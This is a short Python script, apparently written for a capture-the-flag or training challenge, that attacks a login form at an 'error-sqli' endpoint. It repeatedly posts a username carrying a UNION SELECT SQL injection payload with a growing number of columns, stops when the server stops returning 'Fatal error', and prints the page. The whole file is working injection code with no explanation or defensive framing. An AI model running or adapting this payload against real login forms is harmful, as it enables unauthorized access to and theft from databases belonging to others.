from sys import argv
import requests

def print_ascii(word):
    print(list(map(ord, word)))

# print_ascii(argv[1])


sess = requests.session()

def login(n):
    url = 'https://uw2017.p4.team/error-sqli'

    username_q = "a' union select 0"

    for i in range(1, n):
        username_q += ",{}".format(i)

    username_q += "#"

    print(username_q)

    data = {
        'username': username_q,
        'password': 'asd'
    }

    resp = sess.post(url, data=data)

    if not "Fatal error" in resp.text:
        print(resp.text)
        return True
    return False

for c in range(0,30):
    if login(c):
        break
